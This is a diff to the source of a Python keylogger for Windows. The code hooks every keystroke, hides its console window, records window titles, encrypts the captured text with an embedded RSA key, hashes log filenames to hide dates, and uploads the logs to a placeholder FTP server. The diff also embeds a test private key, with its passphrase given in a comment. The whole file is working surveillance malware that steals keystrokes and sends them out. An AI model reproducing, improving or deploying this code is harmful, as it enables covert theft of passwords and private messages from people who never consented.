@@ -1,23 +1,24 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
-import os
-import sys
-import threading
-import win32event
-import win32api
-import winerror
-import win32console
-import win32gui
-import ctypes
-import smtplib
-import ftplib
-import urllib
-import datetime
-import keyboard             # see https://github.com/boppreh/keyboard.
-import Crypto.PublicKey
-import Crypto.Cipher
+import keyboard            # for keyboard hooks. See docs https://github.com/boppreh/keyboard
+import os                  # for handling paths and removing files (FTP mode)
+import sys                 # for getting sys.argv
+import win32event, \
+       win32api, winerror  # for disallowing multiple instances
+import win32console        # for getting the console window
+import win32gui            # for getting window titles and hiding the console window
+import ctypes              # for getting window titles, current keyboard layout and capslock state
+import threading, smtplib  # for emailing logs
+import ftplib              # for sending logs via FTP
+import urllib              # for accessing Google Forms
+import datetime            # for getting the current time and using timedelta
+from Crypto.PublicKey import RSA
+from Crypto.Cipher import PKCS1_OAEP
+from Crypto.Hash import SHA3_512
 import base64
+import getpass             # for securely getting the user's passphrase to access the private key.
+import hashlib             # for hashing the names of files
 
 # CONSTANTS
 CHAR_LIMIT = 1000         # this many characters one should type to make the logger log the line_buffer.
@@ -35,75 +36,84 @@ line_buffer, window_name = '', ''
 time_logged = datetime.datetime.now() - datetime.timedelta(minutes=MINUTES_TO_LOG_TIME)
 count, backspace_buffer_len = 0, 0
 
-pgp_public_key = """-----BEGIN PUBLIC KEY-----
-MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA2jAIPHPO8lYjkBikKYkW
-ta0nQGfBtLT41jLyh74+4KHYv/gRjcme6TGo5e0aN/83ejYHoVQkP5mRFvMi8lkN
-svMUn6xv2+bAvt9S5ya7mmHSOgnQNtmGplUi9ogu68AzL1TOFkXv9ErYeo518YYB
-6GqRB3QSJkBy8Vazyb7/BBCv3Cabl9SRwJXpJX/2RsGUbXDlczA42q2sIMty1U5W
-xPlrndfFZeWR79in7rwe7CpGxnKRSROhf8Y+x9m6BMCbLbB7uNbfsdanSM1CRDce
-ivq+REbtNAhG8UtwimNrJQkpFuQRDjuHI1J3aoCS9kEMPvhsAeboYRqGa/BW9Gij
-nKd1ActHxz9O6Je2RArRTxYMePuJZlCWJWudw0tKnLVTgYP6kxMrupqAhH6eXxKI
-QXkzQd2qjHrh1NYwGd6Op/bQDnFs0D312TL0ft0sXtTkB5ys/uap5vZNJQoOi77I
-zNXrlHUPoqKH+RD7n81GZU+wvyPIZXBGsLoA5uo1JpAHm+M+ijX2xenge/wWEyV2
-G/mZrUpaz0am7iqMJ91fHhpUtWInVBx5iwEPrmVb0PPwPEJ3actpYUutmn/rp8ul
-Pq6Kf9hz4TP8HvW3SRoqhS1wi3py7eO9lfiO8lf77ZE6OBe84Uql/y70otQvVzGN
-hLlzyK+GDbQxI5KBh3lNVg0CAwEAAQ==
+# RSA KEYS FOR ENCRYPTION. Use the commands at the bottom of this script to generate a new key pair.
+public_key_str = """-----BEGIN PUBLIC KEY-----
+MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAt3bksLIIV7w2WPcVLMPH
+l+dL6wMxSMiwxiK2a/wk2Ba0aQCpOZyPaJSAXbCl0kPU7NL9qBoBpKOD27MKl65m
+BTIT45SDcUjJVUvHvueEIPmRhATQFEDE1id2OexNk7TWpm3us8KQUlPrUeviEMNN
+jI4/z5lNcD6/YTjEZx+iQ3ERO5yyQJ1KX5GwFI91RfRPsSuswU3U7K7X1yM4KhHL
+gafblBfh9GR3VEUv5g/DtKjiViVpcpV4hxzShq2or+QvzCngBk+ZPJg8+jH3PFgT
+VBKf3WDs7x0fLco81wdqj3fIlTPAM29jtllvRIM7kvYVZVTI/sn8CckX158Dtim7
+Hv5i3T4zGcONpRVn/9VK8NrIZyAvaDsQyTc7J0zdUY6tj3fTZXYvyWj9gBAh0leL
+99f9CQR+rWd8E2ifrHdJ+ogn31UkXw7jfLvDWrOcThK+ZILK5Z9QCe9ZXJ9RzjSZ
+oE9HAYRvBgbRASRvs4+lq37kLy+oJGunpp5tu5pBy2lS+eLEtRjYs86JPZ+rsEOw
+2cPy5dCoowMxZnSXDJibBoa2uCXRrwupNZLtZ1jH6EdVdEqcyKjp9YUDkWn1tU1w
+n8YpjZ0pK5rEUEubmjPSBzupYjj/eTuZONrED2mhcojPZX75UjQzsnWRLgfjSeec
+4ireBJiz//vwQHVs2ZFSo18CAwEAAQ==
 -----END PUBLIC KEY-----"""
-pgp_public_key = bytes(pgp_public_key, 'utf-8')
+public_key = bytes(public_key_str, 'utf-8')
+# with open("public_key.pem", "rb") as f:
+#     public_key = f.read()
 
-# pgp private key for testing purposes only!
-pgp_private_key = """-----BEGIN RSA PRIVATE KEY-----
-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
------END RSA PRIVATE KEY-----"""
-pgp_private_key = bytes(pgp_private_key, 'utf-8')
+# private key for testing purposes only!
+private_key_str = """-----BEGIN PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: DES-EDE3-CBC,43A5A1A3E59DAC43
+
+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
+jov/2RKescJWOnXUg2kTHMnrsjYvtRjn
+-----END PRIVATE KEY-----"""
+private_key = bytes(private_key_str, 'utf-8')
+# with open("private_key.pem", "rb") as f:
+#     private_key = f.read()
 
 # Languages codes, taken from http://atpad.sourceforge.net/languages-ids.txt
 lcid_dict = {'0x436': 'Afrikaans - South Africa', '0x041c': 'Albanian - Albania', '0x045e': 'Amharic - Ethiopia',
@@ -214,11 +224,11 @@ initial_language = detect_key_layout()
 
 # - GLOBAL SCOPE VARIABLES end -
 
-# Disallowing Multiple Instances
+# Disallowing multiple instances
 mutex = win32event.CreateMutex(None, 1, 'mutex_var_qpgy')
 if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
     mutex = None
-    print("Multiple Instance not Allowed")
+    print("Multiple instance not allowed")
     exit(0)
 
 
@@ -253,19 +263,21 @@ def hide():
     return True
 
 
-def decrypt(encrypted_blob):
+def decrypt(encrypted_blob, passphrase=None):
     # Debug only, don't decrypt in production. Decrypt on your own.
-    global pgp_private_key
-    rsa_key = Crypto.PublicKey.RSA.importKey(pgp_private_key)                       # your private key (only for debugging)
-    rsa_key = Crypto.Cipher.PKCS1_OAEP.new(rsa_key)
+    global private_key
+    key = RSA.importKey(private_key, passphrase)
+    cipher = PKCS1_OAEP.new(key, hashAlgo=SHA3_512)
     # Base 64 decode the data
     encrypted_blob = base64.b64decode(encrypted_blob)
-    decrypted_msgstr = rsa_key.decrypt(encrypted_blob)
-    del rsa_key  # do at least this as soon as possible
-    return decrypted_msgstr
+    decrypted_message = cipher.decrypt(encrypted_blob)
+    del key, cipher  # do at least this as soon as possible
+    return decrypted_message
 
 
-def decrypt_many(encrypted):
+def decrypt_many(encrypted, passphrase=None):
+    if passphrase == '':
+        passphrase = None
     delimiter = '---END---'
     if isinstance(encrypted, bytes):
         encrypted = encrypted.decode('utf-8')
@@ -276,21 +288,22 @@ def decrypt_many(encrypted):
     # filter the empty elements
     encrypted_messages = [k for k in encrypted_split if len(k) > 0]
     # decrypt each message
-    decrypted_blob = '\n'.join([decrypt(bytes(m, 'utf-8')).decode('utf-8') for m in encrypted_messages])
+    decrypted_blob = '\n'.join([decrypt(bytes(m, 'utf-8'), passphrase).decode('utf-8') for m in encrypted_messages])
     return decrypted_blob
 
 
-def encrypt(message_to_encrypt):
-    global pgp_public_key
-    # Import the Public Key and use for encryption using PKCS1_OAEP
-    rsa_key = Crypto.PublicKey.RSA.importKey(pgp_public_key)
-    rsa_key = Crypto.Cipher.PKCS1_OAEP.new(rsa_key)
-    message_to_encrypt = bytes(message_to_encrypt, 'utf-8')
+def encrypt(message_str):
+    global public_key
+    # Import the Public Key and use for encryption using PKCS1_OAEP (RSAES-OAEP).
+    # See https://www.dlitz.net/software/pycrypto/api/2.6/Crypto.Cipher.PKCS1_OAEP-module.html
+    key = RSA.importKey(public_key)
+    cipher = PKCS1_OAEP.new(key, hashAlgo=SHA3_512)
+    message = bytes(message_str, 'utf-8')
     # Use the public key for encryption
-    encrypted = rsa_key.encrypt(message_to_encrypt)
-    del rsa_key
-    # Base 64 encode the encrypted file
-    encrypted_message = base64.b64encode(encrypted)
+    ciphertext = cipher.encrypt(message)
+    del key
+    # Base 64 encode the encrypted message
+    encrypted_message = base64.b64encode(ciphertext)
     return encrypted_message
 
 
@@ -298,13 +311,14 @@ def log_local():
     # Local mode
     global full_path, line_buffer, backspace_buffer_len
     todays_date = datetime.datetime.now().strftime('%Y-%b-%d')
+    # md5 only for masking dates - it's easily crackable:
+    todays_date_hashed = hashlib.md5(bytes(todays_date, 'utf-8')).hexdigest()
     try:
-        with open(full_path + "\\" + todays_date + ".txt", "a") as fp:
+        with open(full_path + "\\" + todays_date_hashed + ".txt", "a") as fp:
             fp.write(line_buffer)
-            line_buffer, backspace_buffer_len = '', 0
     except Exception as e:
         print(e)
-        line_buffer, backspace_buffer_len = '', 0
+    line_buffer, backspace_buffer_len = '', 0
     return True
 
 
@@ -365,11 +379,15 @@ def log_ftp():
     # FTP mode - Upload logs to FTP account
     global line_buffer, count, backspace_buffer_len
     todays_date = datetime.datetime.now().strftime('%Y-%b-%d')
+    # md5 only for masking dates - it's easily crackable:
+    todays_date_hashed = hashlib.md5(bytes(todays_date, 'utf-8')).hexdigest()
     count += 1
-    FILENAME = todays_date + "-" + str(count) + ".txt"
-    fp = open(FILENAME, "a")
-    fp.write(line_buffer)
-    fp.close()
+    FILENAME = todays_date_hashed + "-" + str(count) + ".txt"
+    try:
+        with open(FILENAME, "a") as fp:
+            fp.write(line_buffer)
+    except Exception as e:
+        print(e)
     line_buffer, backspace_buffer_len = '', 0
     try:
         SERVER = "ftp.xxxxxx.com"   # Specify your FTP Server address
@@ -382,11 +400,10 @@ def log_ftp():
         else:
             ft = ftplib.FTP_TLS(SERVER, USERNAME, PASSWORD)
         ft.cwd(OUTPUT_DIR)
-        fp = open(FILENAME, 'rb')
-        cmd = 'STOR' + ' ' + FILENAME
-        ft.storbinary(cmd, fp)
-        ft.quit()
-        fp.close()
+        with open(FILENAME, 'rb') as fp:
+            cmd = 'STOR' + ' ' + FILENAME
+            ft.storbinary(cmd, fp)
+            ft.quit()
         os.remove(FILENAME)
     except Exception as e:
         print(e)
@@ -529,10 +546,27 @@ def key_callback(event):
     return True  # pass event to other handlers
 
 
-on_press_hook_manager = keyboard.hook(key_callback)
-keyboard.wait()
-
+# UNCOMMENT THIS TO READ ENCRYPTED LOGS (passphrase for the private key above - 'pass'):
 test_string = """
-
+---START---.......---END---
+---START---.......---END---
 """
-# print('decrypted log: ', decrypt_many(test_string))
+# passphrase = getpass.getpass(prompt='Enter your private key passphrase')
+# print('decrypted log: ', decrypt_many(test_string, passphrase))
+
+# UNCOMMENT THIS TO GENERATE NEW RSA PUBLIC-PRIVATE KEY PAIR:
+"""
+passphrase = getpass.getpass(prompt='Enter your private key passphrase')
+new_key = RSA.generate(4096)
+export_format = 'PEM'
+private_key = new_key.exportKey(pkcs=8, passphrase=passphrase)
+public_key = new_key.publickey().exportKey(format=export_format)
+with open("private_key." + export_format.lower(), "wb") as f:
+    f.write(private_key)
+with open("public_key." + export_format.lower(), "wb") as f:
+    f.write(public_key)
+"""
+
+# COMMENT THIS TO USE OTHER COMMANDS WITHOUT LANDING HERE
+keyboard.hook(key_callback)
+keyboard.wait()
